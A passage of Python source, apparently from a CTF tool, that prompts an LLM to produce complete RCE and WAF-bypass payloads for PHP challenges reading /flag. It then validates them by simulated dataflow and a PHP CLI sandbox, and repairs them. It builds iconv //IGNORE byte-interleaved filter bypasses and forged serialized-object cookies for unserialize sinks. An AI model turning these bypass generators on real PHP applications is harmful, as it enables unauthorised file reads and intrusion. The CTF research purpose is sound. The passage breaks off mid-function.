    def _parse_selected_paths_from_parsed(parsed: Dict, valid_paths: Set[str]) -> List[str]:
        raw_paths = parsed.get("selected_files", [])
        if not isinstance(raw_paths, list):
            return []
        selected: List[str] = []
        for raw in raw_paths:
            path = str(raw or "").strip().replace("\\", "/")
            if path in valid_paths and path not in selected:
                selected.append(path)
        return selected

    @staticmethod
    def render_project_source(files: Sequence[ProjectSourceFile]) -> str:
        chunks: List[str] = []
        total = 0
        for file in files:
            header = f"\n/* BEGIN_FILE: {file.path} */\n"
            footer = f"\n/* END_FILE: {file.path} */\n"
            chunk = header + file.content + footer
            encoded_len = len(chunk.encode("utf-8", "replace"))
            if total + encoded_len > MAX_PROJECT_SOURCE_BYTES:
                chunks.append(
                    f"\n/* PUREWAF_SOURCE_TRUNCATED: context budget reached before {file.path} */\n"
                )
                break
            chunks.append(chunk)
            total += encoded_len
        return "".join(chunks).strip()

    def review_payloads(
        self,
        source: str,
        analysis_lines: Sequence[str],
        shortest_root: str = "N/A",
        shortest_flag: str = "N/A",
        root_payloads: Optional[Sequence[str]] = None,
        flag_payloads: Optional[Sequence[str]] = None,
        validation_results: Optional[Sequence[PayloadValidationResult]] = None,
        waf_extraction: Optional[LlmWafExtraction] = None,
        transform_chain: Optional[object] = None,
        sink_kind: str = "",
        payload_context: str = "any",
        flagfile: str = "/flag",
    ) -> LlmPayloadReview:
        settings, error = self._load_settings()
        if error:
            if self.session:
                self.session.record_tool_result("llm_payload_review", {"error": error})
            return LlmPayloadReview(error=error)

        content, endpoint, chat_error = self._chat_completion(
            settings,
            self.build_payload_review_messages(
                source=source,
                analysis_lines=analysis_lines,
                shortest_root=shortest_root,
                shortest_flag=shortest_flag,
                root_payloads=root_payloads or [],
                flag_payloads=flag_payloads or [],
                validation_results=validation_results or [],
                waf_extraction=waf_extraction,
                transform_chain=transform_chain,
            ),
            max_tokens=1000,
        )
        if chat_error:
            if self.session:
                self.session.record_tool_result("llm_payload_review", {"error": chat_error})
            return LlmPayloadReview(
                used=True,
                model=settings.model,
                endpoint=endpoint,
                error=chat_error,
            )

        try:
            review = self._parse_payload_review(content)
        except Exception as exc:
            if self.session:
                self.session.record_tool_result("llm_payload_review", {"error": str(exc)})
            return LlmPayloadReview(
                used=True,
                model=settings.model,
                endpoint=endpoint,
                error=f"LLM payload review invalid: {exc}",
            )
        validation_error = self._payload_review_validation_error(review)
        if validation_error:
            if self.session:
                self.session.record_tool_result(
                    "llm_payload_review",
                    {"error": validation_error, "valid": review.valid},
                )
            return LlmPayloadReview(
                used=True,
                model=settings.model,
                endpoint=endpoint,
                valid=review.valid,
                fallback_payload=review.fallback_payload,
                payload_value=review.payload_value,
                request_path=review.request_path,
                payload_context=review.payload_context,
                request_headers=dict(review.request_headers),
                request_cookies=dict(review.request_cookies),
                source=review.source,
                evidence=review.evidence,
                notes=review.notes,
                error=f"LLM payload review invalid: {validation_error}",
            )
        review = self._finalize_payload_review(
            review=review,
            source=source,
            sink_kind=sink_kind,
            payload_context=payload_context,
            flagfile=flagfile,
            transform_chain=transform_chain,
            waf_extraction=waf_extraction,
        )
        review.used = True
        review.model = settings.model
        review.endpoint = endpoint
        if self.session:
            self.session.record_tool_result(
                "llm_payload_review",
                {
                    "valid": review.valid,
                    "has_fallback": bool(review.fallback_payload),
                    "payload_value": review.payload_value,
                    "request_path": review.request_path,
                    "request_headers": review.request_headers,
                    "request_cookies": review.request_cookies,
                    "source": review.source,
                    "evidence": review.evidence,
                    "notes": review.notes,
                    "error": review.error,
                },
            )
        return review

    def build_payload_review_messages(
        self,
        source: str,
        analysis_lines: Sequence[str],
        shortest_root: str,
        shortest_flag: str,
        root_payloads: Sequence[str],
        flag_payloads: Sequence[str],
        validation_results: Sequence[PayloadValidationResult] = (),
        waf_extraction: Optional[LlmWafExtraction] = None,
        transform_chain: Optional[object] = None,
    ) -> List[Dict[str, str]]:
        final_payload = shortest_flag if shortest_flag and shortest_flag != "N/A" else ""
        payload_summary = {
            "purewaf_final_payload": final_payload or "N/A",
            "shortest_root": shortest_root,
            "shortest_flag": shortest_flag,
            "root_payloads": list(root_payloads[:8]),
            "flag_payloads": list(flag_payloads[:8]),
            "analysis_lines": list(analysis_lines[-20:]),
            "validation_results": [item.as_dict() for item in list(validation_results)[:8]],
        }
        fallback_required, fallback_reason = self._review_fallback_requirement(
            shortest_flag=shortest_flag,
            flag_payloads=flag_payloads,
            validation_results=validation_results,
        )
        payload_summary["fallback_required"] = fallback_required
        payload_summary["fallback_reason"] = fallback_reason
        if waf_extraction is not None:
            payload_summary["llm_waf_extraction"] = {
                "blocked_words": waf_extraction.waf_words,
                "blocked_chars": waf_extraction.waf_chars,
                "regex_patterns": waf_extraction.waf_regex,
                "length_limit": waf_extraction.limit_length,
            }
        if transform_chain:
            if hasattr(transform_chain, "as_dict"):
                payload_summary["transform_chain"] = transform_chain.as_dict()
            elif isinstance(transform_chain, dict):
                payload_summary["transform_chain"] = transform_chain
        waf_constraint_instruction = ""
        if waf_extraction is not None:
            waf_constraint_instruction = (
                " The fallback_payload MUST NOT contain any blocked words, characters, "
                "or match regex patterns listed in the llm_waf_extraction field as the "
                "PHP source sees the value at the filter point. For URL query values, "
                "judge this after HTTP percent-decoding, not from the printed URL alone."
            )
        return [
            {
                "role": "system",
                "content": (
                    self._immutable_context(
                        "Stage 2 generated-payload review, and Stage 3 fallback only if needed."
                    )
                    + "\n\n"
                    "You are a CTF Web expert reviewing PureWaf-generated payloads for a PHP "
                    "RCE/WAF-bypass challenge. Your primary objective is reading /flag. Use only "
                    "the supplied source, PureWaf output, and validation summary. First identify "
                    "whether the detected sink/filter context can execute a payload that reads /flag. "
                    "If PureWaf produced "
                    "a usable /flag payload, set valid=true and leave fallback_payload empty. If "
                    "PureWaf produced no usable /flag payload, or the provided payload does not fit "
                    "the detected sink/filter context, set valid=false and provide exactly one "
                    "payload_value/fallback_payload that reads /flag through the detected sink. When "
                    "fallback_required is true in the PureWaf output summary, fallback_payload is "
                    "mandatory and must be non-empty. The payload_value must be the complete, "
                    "directly usable exploit input value for the vulnerable parameter. If the "
                    "input is an HTTP query parameter, payload_value should be the exact query "
                    "value bytes expressed as URL-safe text; do not replace a byte-level payload "
                    "with its decoded Unicode display form. If route "
                    "and input key are known, also return request_path as the complete path and "
                    "query string, for example /preview.php?f=value. It must not be a "
                    "fragment, placeholder, pseudocode, explanation, or post-processing step. For "
                    "shell_command sinks, return the full shell command value. For php_code sinks, "
                    "return the full PHP code snippet. For file_read_path sinks, return the exact "
                    "path, stream-wrapper resource value, or route query value that the source "
                    "dataflow proves will become the sink path. If source shows iconv or "
                    "mb_convert_encoding with //IGNORE after a raw WAF check, reason at byte "
                    "level: a valid fallback may need non-ASCII/invalid bytes interleaved between "
                    "ASCII target path letters so the raw WAF does not see a blocked word but the "
                    "conversion drops those bytes before file_get_contents. If source shows "
                    "required request state such as a Cookie-controlled object/property, include "
                    "complete request_cookies or request_headers; otherwise the final request is "
                    "not directly usable."
                    f"{waf_constraint_instruction}"
                    " Do not "
                    "give exploitation steps or prose outside JSON. Return only JSON shaped as "
                    "{\"valid\":true,\"payload_value\":\"\",\"request_path\":\"\","
                    "\"request_headers\":{\"Cookie\":\"name=value\"},"
                    "\"request_cookies\":{\"name\":\"value\"},"
                    "\"payload_context\":\"file_path\",\"source\":\"purewaf\","
                    "\"fallback_payload\":\"\",\"evidence\":\"short source-based proof\","
                    "\"notes\":\"short source-based note\"}."
                ),
            },
            {
                "role": "user",
                "content": (
                    "PHP project source bundle:\n\n"
                    f"{source[:MAX_PROJECT_SOURCE_BYTES]}\n\n"
                    "PureWaf output summary:\n"
                    f"{json.dumps(payload_summary, ensure_ascii=False)}"
                ),
            },
        ]

    @staticmethod
    def _review_fallback_requirement(
        shortest_flag: str,
        flag_payloads: Sequence[str],
        validation_results: Sequence[PayloadValidationResult],
    ) -> Tuple[bool, str]:
        flag_candidates = [
            str(payload or "").strip()
            for payload in [shortest_flag, *list(flag_payloads or [])]
            if str(payload or "").strip() and str(payload or "").strip() != "N/A"
        ]
        if not flag_candidates:
            return True, "PureWaf did not produce a /flag payload"

        attempted_results = [
            item
            for item in validation_results
            if getattr(item, "attempted", False) and not getattr(item, "skipped", False)
        ]
        if attempted_results and not any(getattr(item, "passed", False) for item in attempted_results):
            return True, "PHP CLI sandbox validation did not confirm any PureWaf /flag payload"

        return False, ""

    @staticmethod
    def _payload_review_validation_error(review: LlmPayloadReview) -> str:
        candidate = review.payload_value or review.fallback_payload or review.request_path
        if not review.valid and not candidate:
            return "fallback_payload is required when valid=false"
        if candidate and PureWafProjectAgent._fallback_payload_looks_incomplete(candidate):
            return "fallback_payload must be a complete directly usable payload"
        return ""

    def _finalize_payload_review(
        self,
        review: LlmPayloadReview,
        source: str,
        sink_kind: str,
        payload_context: str,
        flagfile: str,
        transform_chain: Optional[object],
        waf_extraction: Optional[LlmWafExtraction],
    ) -> LlmPayloadReview:
        if not review.payload_context:
            review.payload_context = payload_context or ""

        candidate = self._review_payload_value_for_validation(review, transform_chain)
        if sink_kind == "file_read_path" and transform_chain and candidate:
            validation_context = review.payload_context or payload_context or "any"
            validation_results = self.validate_payloads(
                [candidate],
                sink_kind=sink_kind,
                payload_context=validation_context,
                flagfile=flagfile,
                transform_chain=transform_chain,
                waf_extraction=waf_extraction,
            )
            if validation_results and not any(item.passed for item in validation_results):
                repaired = self._repair_iconv_ignore_review_payload(
                    review=review,
                    source=source,
                    flagfile=flagfile,
                    transform_chain=transform_chain,
                    waf_extraction=waf_extraction,
                    payload_context=payload_context,
                )
                if repaired is not None:
                    review = repaired
                    validation_context = review.payload_context or payload_context or "any"
                    repaired_candidate = self._review_payload_value_for_validation(
                        review,
                        transform_chain,
                    )
                    validation_results = self.validate_payloads(
                        [repaired_candidate],
                        sink_kind=sink_kind,
                        payload_context=validation_context,
                        flagfile=flagfile,
                        transform_chain=transform_chain,
                        waf_extraction=waf_extraction,
                    )
                if validation_results and not any(item.passed for item in validation_results):
                    first = validation_results[0]
                    review.error = (
                        "LLM fallback payload failed dataflow validation: "
                        f"{first.reason}"
                    )

        self._ensure_review_request_state(review, source, transform_chain)
        return review

    @staticmethod
    def _review_payload_value_for_validation(
        review: LlmPayloadReview,
        transform_chain: Optional[object],
    ) -> str:
        request_value = PureWafProjectAgent._extract_request_query_value(
            review.request_path,
            transform_chain,
        )
        if request_value:
            return request_value
        return review.payload_value or review.fallback_payload or review.request_path

    @staticmethod
    def _extract_request_query_value(request_path: str, transform_chain: Optional[object]) -> str:
        text = str(request_path or "").strip()
        if "?" not in text:
            return ""
        query = text.split("?", 1)[1].split("#", 1)[0]
        if not query:
            return ""

        key = ""
        chain = PureWafProjectAgent._coerce_transform_chain_dict(transform_chain)
        input_ref = chain.get("input")
        if isinstance(input_ref, dict):
            key = str(input_ref.get("key", "") or "").strip()

        pairs = [part for part in query.split("&") if part]
        fallback_value = ""
        for part in pairs:
            raw_key, sep, raw_value = part.partition("=")
            if not sep:
                raw_value = ""
            if not fallback_value:
                fallback_value = raw_value
            if key and urllib.parse.unquote_plus(raw_key) == key:
                return raw_value
        if not key and len(pairs) == 1:
            return fallback_value
        return ""

    def _repair_iconv_ignore_review_payload(
        self,
        review: LlmPayloadReview,
        source: str,
        flagfile: str,
        transform_chain: Optional[object],
        waf_extraction: Optional[LlmWafExtraction],
        payload_context: str,
    ) -> Optional[LlmPayloadReview]:
        chain = self._coerce_transform_chain_dict(transform_chain)
        chain_text = self._transform_chain_text(chain)
        combined = f"{source}\n{chain_text}".lower()
        if "iconv" not in combined and "mb_convert_encoding" not in combined:
            return None
        if "ignore" not in combined:
            return None
        if "preg_match" not in combined and "filter" not in chain_text.lower():
            return None

        target_leaf = (flagfile or "/flag").replace("\\", "/").strip("/") or "flag"
        target_leaf = target_leaf.rsplit("/", 1)[-1] or "flag"
        if not re.fullmatch(r"[A-Za-z0-9._-]+", target_leaf):
            return None

        payload_value = self._build_iconv_ignore_interleaved_ascii_payload(target_leaf)
        validation_context = "url_query_value" if self._chain_has_route_input(chain) else (
            payload_context or review.payload_context or "file_path"
        )
        if waf_extraction is not None:
            allowed, _reason = self._dataflow_waf_allows(
                payload_value,
                validation_context,
                waf_extraction,
            )
            if not allowed:
                return None

        repaired = LlmPayloadReview(
            used=review.used,
            model=review.model,
            endpoint=review.endpoint,
            valid=False,
            fallback_payload=payload_value,
            payload_value=payload_value,
            request_path=self._build_request_path_for_payload(payload_value, chain, review),
            request_headers=dict(review.request_headers),
            request_cookies=dict(review.request_cookies),
            payload_context=validation_context,
            source="agent_dataflow_repair",
            evidence=(
                "review fallback failed byte-level dataflow validation; generated an "
                "iconv //IGNORE byte-interleaved query value that avoids the raw filter "
                f"and converts to {target_leaf} before file_get_contents"
            ),
            notes=self._append_note(
                review.notes,
                "agent repaired fallback after dataflow validation rejected the LLM value",
            ),
        )
        self._ensure_review_request_state(repaired, source, transform_chain)
        return repaired

    @staticmethod
    def _chain_has_route_input(chain: Dict[str, object]) -> bool:
        route = chain.get("route")
        input_ref = chain.get("input")
        return (
            isinstance(route, dict)
            and bool(str(route.get("path", "") or "").strip())
            and isinstance(input_ref, dict)
            and bool(str(input_ref.get("key", "") or "").strip())
        )

    @staticmethod
    def _build_request_path_for_payload(
        payload_value: str,
        chain: Dict[str, object],
        review: LlmPayloadReview,
    ) -> str:
        if review.request_path and "?" in review.request_path:
            key = ""
            input_ref = chain.get("input")
            if isinstance(input_ref, dict):
                key = str(input_ref.get("key", "") or "").strip()
            path = review.request_path.split("?", 1)[0] or ""
            if key:
                return f"{path}?{urllib.parse.quote_plus(key)}={payload_value}"
        route = chain.get("route")
        input_ref = chain.get("input")
        if not isinstance(route, dict) or not isinstance(input_ref, dict):
            return review.request_path
        path = str(route.get("path", "") or "").strip()
        key = str(input_ref.get("key", "") or "").strip()
        if not path or not key:
            return review.request_path
        return f"{path}?{urllib.parse.quote_plus(key)}={payload_value}"

    @staticmethod
    def _build_iconv_ignore_interleaved_ascii_payload(text: str) -> str:
        noise = [0xE4, 0xB8, 0xAF, 0xE6, 0x9C, 0x87]
        chars = list(text)
        if not chars:
            return ""
        counts = [1 for _ in chars]
        extra = max(0, len(noise) - len(chars))
        for idx in range(max(0, len(chars) - extra), len(chars)):
            counts[idx] += 1
        out: List[str] = []
        noise_idx = 0
        for idx, ch in enumerate(chars):
            for _ in range(counts[idx]):
                byte = noise[noise_idx % len(noise)]
                out.append(f"%{byte:02X}")
                noise_idx += 1
            if re.fullmatch(r"[A-Za-z0-9._~-]", ch):
                out.append(ch)
            else:
                out.append(urllib.parse.quote(ch, safe=""))
        return "".join(out)

    def _ensure_review_request_state(
        self,
        review: LlmPayloadReview,
        source: str,
        transform_chain: Optional[object],
    ):
        spec = self._serialized_user_cookie_spec(source, transform_chain)
        if spec is None:
            return
        cookie_name, cookie_value = spec
        if not cookie_name or not cookie_value:
            return
        if cookie_name not in review.request_cookies:
            review.request_cookies[cookie_name] = cookie_value
        self._ensure_cookie_header(review)
        review.notes = self._append_note(
            review.notes,
            f"requires Cookie {cookie_name} with basePath=/ and encoding=ISO-2022-CN-EXT",
        )

    @staticmethod
    def _serialized_user_cookie_spec(
        source: str,
        transform_chain: Optional[object],
    ) -> Optional[Tuple[str, str]]:
        text = source or ""
        lowered = text.lower()
        if "unserialize" not in lowered or "$_cookie" not in lowered:
            return None
        if "basepath" not in lowered or "encoding" not in lowered:
            return None
        chain_text = PureWafProjectAgent._transform_chain_text(
            PureWafProjectAgent._coerce_transform_chain_dict(transform_chain)
        )
        if "iconv" not in f"{lowered}\n{chain_text.lower()}":
            return None

        cookie_match = re.search(r"\$_COOKIE\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", text)
        cookie_name = cookie_match.group(1) if cookie_match else "user"
        class_match = re.search(r"\bclass\s+([A-Za-z_]\w*)", text)
        class_name = class_match.group(1) if class_match else "User"

        props = re.findall(
            r"\bpublic\s+(?:\??[A-Za-z_\\][\w\\]*\s+)?\$([A-Za-z_]\w*)",
            text,
        )
        preferred = [
            ("name", "guest"),
            ("encoding", "ISO-2022-CN-EXT"),
            ("basePath", "/"),
        ]
        if props:
            prop_set = set(props)
            values = [(name, value) for name, value in preferred if name in prop_set]
        else:
            values = preferred
        if not any(name == "encoding" for name, _value in values):
            values.append(("encoding", "ISO-2022-CN-EXT"))
        if not any(name == "basePath" for name, _value in values):
            values.append(("basePath", "/"))
        serialized = PureWafProjectAgent._serialize_public_php_object(class_name, values)
        return cookie_name, urllib.parse.quote(serialized, safe="")

    @staticmethod
    def _serialize_public_php_object(class_name: str, values: Sequence[Tuple[str, str]]) -> str:
        def php_string(value: str) -> str:
            text = str(value)
            return f's:{len(text.encode("utf-8"))}:"{text}";'

        fields = "".join(php_string(name) + php_string(value) for name, value in values)
        return f'O:{len(class_name.encode("utf-8"))}:"{class_name}":{len(values)}:{{{fields}}}'

    @staticmethod
    def _ensure_cookie_header(review: LlmPayloadReview):
        if not review.request_cookies:
            return
        cookie_header = "; ".join(
            f"{name}={value}" for name, value in review.request_cookies.items()
        )
        existing_key = ""
        for key in review.request_headers:
            if key.lower() == "cookie":
                existing_key = key
                break
        if existing_key:
            existing = review.request_headers.get(existing_key, "")
            for name, value in review.request_cookies.items():
                if f"{name}=" not in existing:
                    existing = (existing.rstrip("; ") + "; " if existing else "") + f"{name}={value}"
            review.request_headers[existing_key] = existing
        else:
            review.request_headers["Cookie"] = cookie_header

    @staticmethod
    def _append_note(existing: str, note: str) -> str:
        existing = str(existing or "").strip()
        note = str(note or "").strip()
        if not note or note.lower() in existing.lower():
            return existing
        return (existing + "; " + note).strip("; ") if existing else note

    @staticmethod
    def _fallback_payload_looks_incomplete(payload: str) -> bool:
        text = str(payload or "").strip()
        if not text:
            return True
        lowered = text.lower()
        incomplete_markers = (
            "<payload>",
            "<command>",
            "<cmd>",
            "{{payload}}",
            "{{command}}",
            "replace_me",
            "your_payload",
            "your command",
            "todo",
            "...",
        )
        if any(marker in lowered for marker in incomplete_markers):
            return True
        return bool(re.match(r"^(try|use|run|execute)\s+", lowered))

    def validate_payloads(
        self,
        payloads: Sequence[str],
        sink_kind: str = "",
        payload_context: str = "any",
        flagfile: str = "/flag",
        transform_chain: Optional[object] = None,
        waf_extraction: Optional[LlmWafExtraction] = None,
    ) -> List[PayloadValidationResult]:
        candidates = [
            str(payload or "").strip()
            for payload in payloads
            if str(payload or "").strip() and str(payload or "").strip() != "N/A"
        ][:MAX_VALIDATION_PAYLOADS]
        if self.session:
            self.session.step(
                "payload_validation",
                "php_cli_sandbox",
                {
                    "candidate_count": len(candidates),
                    "sink_kind": sink_kind,
                    "payload_context": payload_context,
                    "dataflow_validation": bool(transform_chain),
                    "network_php_allowed": True,
                },
            )

        if not candidates:
            result = PayloadValidationResult(
                payload="",
                sink_kind=sink_kind,
                payload_context=payload_context,
                skipped=True,
                reason="no payload candidates to validate",
            )
            self._record_validation_results([result])
            return [result]

        dataflow_results = self._validate_dataflow_payloads(
            candidates,
            sink_kind=sink_kind,
            payload_context=payload_context,
            flagfile=flagfile,
            transform_chain=transform_chain,
            waf_extraction=waf_extraction,
        )
        if dataflow_results and any(not item.skipped for item in dataflow_results):
            self._record_validation_results(dataflow_results)
            return dataflow_results

        php_bin = shutil.which("php")
        if not php_bin:
            results = [
                PayloadValidationResult(
                    payload=payload,
                    sink_kind=sink_kind,
                    payload_context=payload_context,
                    skipped=True,
                    reason="php CLI not found",
                )
                for payload in candidates
            ]
            self._record_validation_results(results)
            return results

        results: List[PayloadValidationResult] = []
        with tempfile.TemporaryDirectory(prefix="purewaf-agent-") as tmp:
            sandbox = Path(tmp)
            flag_path = sandbox / "flag"
            flag_marker = "PUREWAF_AGENT_FLAG_OK"
            flag_path.write_text(flag_marker, encoding="utf-8")
            for payload in candidates:
                results.append(
                    self._validate_one_payload(
                        php_bin=php_bin,
                        sandbox=sandbox,
                        payload=payload,
                        sink_kind=sink_kind,
                        payload_context=payload_context,
                        flagfile=flagfile,
                        sandbox_flag=flag_path,
                        flag_marker=flag_marker,
                    )
                )

        self._record_validation_results(results)
        return results

    def _validate_dataflow_payloads(
        self,
        payloads: Sequence[str],
        sink_kind: str,
        payload_context: str,
        flagfile: str,
        transform_chain: Optional[object],
        waf_extraction: Optional[LlmWafExtraction],
    ) -> List[PayloadValidationResult]:
        chain = self._coerce_transform_chain_dict(transform_chain)
        if not chain or sink_kind != "file_read_path":
            return []

        results = []
        for payload in payloads:
            results.append(
                self._validate_one_dataflow_payload(
                    payload=payload,
                    sink_kind=sink_kind,
                    payload_context=payload_context,
                    flagfile=flagfile,
                    chain=chain,
                    waf_extraction=waf_extraction,
                )
            )
        return results

    @staticmethod
    def _coerce_transform_chain_dict(transform_chain: Optional[object]) -> Dict[str, object]:
        if transform_chain is None:
            return {}
        if hasattr(transform_chain, "as_dict"):
            try:
                data = transform_chain.as_dict()
                return data if isinstance(data, dict) else {}
            except Exception:
                return {}
        if isinstance(transform_chain, dict):
            return transform_chain
        return {}

    def _validate_one_dataflow_payload(
        self,
        payload: str,
        sink_kind: str,
        payload_context: str,
        flagfile: str,
        chain: Dict[str, object],
        waf_extraction: Optional[LlmWafExtraction],
    ) -> PayloadValidationResult:
        allowed, blocked_reason = self._dataflow_waf_allows(
            payload,
            payload_context,
            waf_extraction,
        )
        if not allowed:
            return PayloadValidationResult(
                payload=payload,
                sink_kind=sink_kind,
                payload_context=payload_context,
                attempted=True,
                passed=False,
                reason=f"raw payload is blocked before transform: {blocked_reason}",
            )

        transformed_values = self._simulate_dataflow_transforms(payload, chain)
        target = (flagfile or "/flag").strip() or "/flag"
        passed_value = ""
        for value in transformed_values:
            if self._dataflow_value_reaches_flag(value, target):
                passed_value = value
                break

        if passed_value:
            return PayloadValidationResult(
                payload=payload,
                sink_kind=sink_kind,
                payload_context=payload_context,
                attempted=True,
                passed=True,
                reason="dataflow transform reaches flag path before file read sink",
                output_excerpt=passed_value,
            )

        return PayloadValidationResult(
            payload=payload,
            sink_kind=sink_kind,
            payload_context=payload_context,
            attempted=True,
            passed=False,
            reason="dataflow transform did not resolve to flag path",
            output_excerpt=" | ".join(transformed_values[:5]),
        )

    @staticmethod
    def _dataflow_waf_allows(
        payload: str,
        payload_context: str,
        waf_extraction: Optional[LlmWafExtraction],
    ) -> Tuple[bool, str]:
        if waf_extraction is None:
            return True, ""

        values, byte_length = PureWafProjectAgent._filter_point_values(
            payload,
            payload_context,
        )
        for word in waf_extraction.waf_words:
            lowered_word = word.lower() if word else ""
            if lowered_word and any(lowered_word in value.lower() for value in values):
                return False, f"word:{word}"
        for ch in waf_extraction.waf_chars:
            if ch and any(ch in value for value in values):
                return False, f"char:{ch}"
        for pattern in waf_extraction.waf_regex:
            regex = PureWafProjectAgent._compile_waf_regex(pattern)
            if regex is not None and any(regex.search(value) for value in values):
                return False, f"regex:{pattern}"
        if waf_extraction.limit_length is not None and byte_length > waf_extraction.limit_length:
            return False, f"len>{waf_extraction.limit_length}"
        return True, ""

    @staticmethod
    def _filter_point_values(payload: str, payload_context: str) -> Tuple[List[str], int]:
        raw = str(payload or "")
        context = str(payload_context or "any").strip().lower()
        if context == "url_query_value":
            try:
                decoded_bytes = urllib.parse.unquote_to_bytes(raw.replace("+", " "))
            except Exception:
                decoded_bytes = raw.encode("utf-8", "replace")
            values = [
                decoded_bytes.decode("latin-1", "replace"),
                decoded_bytes.decode("utf-8", "replace"),
            ]
            return list(dict.fromkeys(values)), len(decoded_bytes)
        return [raw], len(raw.encode("utf-8", "replace"))

    @staticmethod
    def _compile_waf_regex(pattern: str):
        literal = str(pattern or "").strip()
        if not literal:
            return None
        flags = 0
        if literal.startswith("/") and literal.count("/") >= 2:
            last = literal.rfind("/")
            flag_text = literal[last + 1 :]
            literal = literal[1:last]
            if "i" in flag_text:
                flags |= re.I
            if "s" in flag_text:
                flags |= re.S
            if "m" in flag_text:
                flags |= re.M
        try:
            return re.compile(literal, flags)
        except re.error:
            return None

    @staticmethod
    def _simulate_dataflow_transforms(payload: str, chain: Dict[str, object]) -> List[str]:
        raw = str(payload or "")
        variants = [raw]
        try:
            decoded_bytes = urllib.parse.unquote_to_bytes(raw.replace("+", " "))
            decoded_latin1 = decoded_bytes.decode("latin-1", "replace")
            variants.append(urllib.parse.unquote(raw))
            variants.append(decoded_latin1)
        except Exception:
            decoded_bytes = raw.encode("utf-8", "replace")

        chain_text = PureWafProjectAgent._transform_chain_text(chain)
        lowered = chain_text.lower()

        if any(token in lowered for token in ("urldecode", "rawurldecode", "percent", "url decode")):
            try:
                variants.append(urllib.parse.unquote(raw))
            except Exception:
                pass

        if any(token in lowered for token in ("iconv", "mb_convert_encoding", "encoding", "wide byte", "wide-byte", "utf-16")):
            variants.extend(PureWafProjectAgent._decode_iconv_path_variants(decoded_bytes, chain))

        if "stripslashes" in lowered or "backslash" in lowered:
            variants.extend(value.replace("\\", "") for value in list(variants))

        if "strtolower" in lowered:
            variants.extend(value.lower() for value in list(variants))
        if "strtoupper" in lowered:
            variants.extend(value.upper() for value in list(variants))

        return [
            item
            for item in _compact_value(list(dict.fromkeys(variants)), limit=500)
            if isinstance(item, str) and item
        ]

    @staticmethod
    def _transform_chain_text(chain: Dict[str, object]) -> str:
        parts: List[str] = []
        steps = chain.get("dataflow")
        if isinstance(steps, list):
            for step in steps:
                if isinstance(step, dict):
                    parts.extend(
                        str(step.get(key, "") or "")
                        for key in ("kind", "code", "function", "effect")
                    )
        hints = chain.get("strategy_hints")
        if isinstance(hints, list):
            parts.extend(str(item or "") for item in hints)
        return " ".join(parts)

    @staticmethod
    def _decode_iconv_path_variants(data: bytes, chain: Dict[str, object]) -> List[str]:
        variants: List[str] = []
        encodings = PureWafProjectAgent._detect_iconv_source_encodings(chain)
        variants.extend(PureWafProjectAgent._php_iconv_variants(data, encodings))

        for encoding in encodings:
            try:
                decoded = data.decode(encoding.lower(), "ignore")
                if decoded:
                    variants.append(decoded)
            except Exception:
                continue

        try:
            utf8_ignore = data.decode("utf-8", "ignore")
            if utf8_ignore:
                variants.append(utf8_ignore)
        except Exception:
            pass

        # Conservative fallback for iconv(..., "UTF-8//IGNORE") style paths:
        # invalid/high bytes may be dropped, but NUL bytes are preserved unless
        # the source shows an explicit NUL-stripping step.
        ascii_keep_nul = "".join(chr(byte) for byte in data if byte == 0 or 0x20 <= byte < 0x7F)
        if ascii_keep_nul:
            variants.append(ascii_keep_nul)
        if PureWafProjectAgent._chain_explicitly_strips_nuls(chain):
            stripped = ascii_keep_nul.replace("\x00", "")
            if stripped:
                variants.append(stripped)
        return list(dict.fromkeys(variants))

    @staticmethod
    def _detect_iconv_source_encodings(chain: Dict[str, object]) -> List[str]:
        text = PureWafProjectAgent._transform_chain_text(chain)
        known = [
            "ISO-2022-CN-EXT",
            "UTF-8",
            "GBK",
            "BIG5",
            "UTF-16",
            "UTF-16LE",
            "UTF-16BE",
            "ISO-8859-1",
        ]
        found = [encoding for encoding in known if encoding.lower() in text.lower()]
        if found:
            return found
        return ["UTF-8", "ISO-2022-CN-EXT"]

    @staticmethod
    def _php_iconv_variants(data: bytes, encodings: Sequence[str]) -> List[str]:
        php_bin = shutil.which("php")
        if not php_bin:
            return []
        encoded = base64.b64encode(data).decode("ascii")
        enc_json = json.dumps(list(dict.fromkeys(encodings)))
        script = (
            "<?php\n"
            f"$data = base64_decode('{encoded}');\n"
            f"$encodings = json_decode('{enc_json}', true);\n"
            "$out = [];\n"
            "foreach ($encodings as $enc) {\n"
            "    $v = @iconv($enc, 'UTF-8//IGNORE', $data);\n"
            "    if ($v !== false && $v !== '') { $out[] = $v; }\n"
            "}\n"
            "echo json_encode(array_values(array_unique($out)), JSON_UNESCAPED_UNICODE);\n"
        )
        try:
            proc = subprocess.run(
                [php_bin],
                input=script.encode("utf-8"),
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                check=False,
                timeout=VALIDATION_TIMEOUT_SECONDS,
            )
            parsed = json.loads(proc.stdout.decode("utf-8", "replace") or "[]")
        except Exception:
            return []
        return [str(item) for item in parsed if isinstance(item, str) and item]

    @staticmethod
    def _chain_explicitly_strips_nuls(chain: Dict[str, object]) -> bool:
        text = PureWafProjectAgent._transform_chain_text(chain).lower()
        nul_markers = ("\\0", "\\x00", "null byte", "nul byte", "nuls")
        strip_markers = ("str_replace", "replace", "remove", "strip")
        return any(marker in text for marker in nul_markers) and any(
            marker in text for marker in strip_markers
        )

    @staticmethod
    def _dataflow_value_reaches_flag(value: str, target: str) -> bool:
        normalized = str(value or "").replace("\\", "/").strip()
        if "\x00" in normalized:
            return False
        target_norm = (target or "/flag").replace("\\", "/").strip() or "/flag"
        if normalized == target_norm:
            return True
        if normalized in {"flag", "/flag"}:
            return True
        if normalized.endswith(target_norm):
            return True
        lowered = normalized.lower()
        if "resource=" in lowered:
            resource = lowered.rsplit("resource=", 1)[-1]
            return resource in {"flag", "/flag"} or resource.endswith("/flag")
        return False

    def _record_validation_results(self, results: Sequence[PayloadValidationResult]):
        if self.session:
            self.session.record_tool_result(
                "php_cli_payload_validation",
                {
                    "attempted": sum(1 for item in results if item.attempted),
                    "passed": sum(1 for item in results if item.passed),
                    "skipped": sum(1 for item in results if item.skipped),
                    "results": [item.as_dict() for item in list(results)[:5]],
                },
            )

    def _validate_one_payload(
        self,
        php_bin: str,
        sandbox: Path,
        payload: str,
        sink_kind: str,
        payload_context: str,
        flagfile: str,
        sandbox_flag: Path,
        flag_marker: str,
    ) -> PayloadValidationResult:
        normalized_context = (payload_context or "any").strip()
        normalized_kind = (sink_kind or "").strip()
        validation_mode = self._choose_validation_mode(payload, normalized_kind, normalized_context)
        if not validation_mode:
            return PayloadValidationResult(
                payload=payload,
